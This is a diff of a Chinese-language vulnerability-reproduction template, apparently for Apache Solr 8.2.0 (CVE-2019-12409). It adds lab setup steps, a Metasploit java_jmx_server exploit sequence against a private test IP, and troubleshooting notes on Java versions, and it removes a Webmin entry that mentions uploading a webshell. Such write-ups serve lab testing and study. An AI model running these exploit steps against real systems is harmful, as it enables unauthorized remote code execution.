@@ -8,21 +8,42 @@
 漏洞复现模板如下：
 ```
 # 0x00 复现环境
-使用复现环境：https://www.mozhe.cn/bug/detail/124  
-复现版本：Webmin1.910
+使用复现环境：本地搭建的环境  
+复现版本：Solr 8.2.0
 
-# 0x01 利用条件
+# 0x01 环境搭建
+目标环境：centos7_x64_en-us + solr-8.2.0.tgz + openjdk version "1.8.0_181"  
+wget https://archive.apache.org/dist/lucene/solr/8.2.0/solr-8.2.0.tgz  
+tar -xvf ./solr-8.2.0.tgz  
+cd ./solr-8.2.0.tgz/bin/  
+./solr start -force#默认启动端口8983  
+启动后浏览器访问http://127.0.0.1:8983/ ，出现下图所示表示环境配置完成：  
+![image](./1.png)  
+
+# 0x02 利用条件
 无
 
-# 0x02 影响版本
-Webmin<=1.920
+# 0x03 影响版本
+Solr 8.1.1  
+Solr 8.2.0
 
-# 0x03 漏洞复现
+# 0x04 漏洞复现
+攻击环境：kali2020 + msf5  
+msfconsole  
+use exploit/multi/misc/java_jmx_server  
+set rhosts 172.16.35.138  
+set rport 18983  
+run  
+![image](./2.png)
 
-# 0x04 踩坑记录
+# 0x05 踩坑记录
 坑1：  
-上传完一句话木马后，页面会响应3-5分钟，响应时间较长
+在kali下搭建的漏洞环境run多次后一直失败，经查看发现kali下的java版本是openjdk version "11.0.6" 2020-01-14，怀疑可能是java版本过高导致的利用失败，故在ubuntu16.04_x64_en-us下使用java8重新搭建solr-8.2.0.zip，漏洞利用成功。
+看过别人在java10下也有利用成功的文章，怀疑可能exp针对java10及以下的版本才有效。  
+坑2：  
+centos7下默认开启防火墙，需要临时关闭防火墙：“systemctl stop firewalld”
 
-# 参考链接
+# 0x06 参考链接
+https://github.com/jas502n/CVE-2019-12409
 
 ```
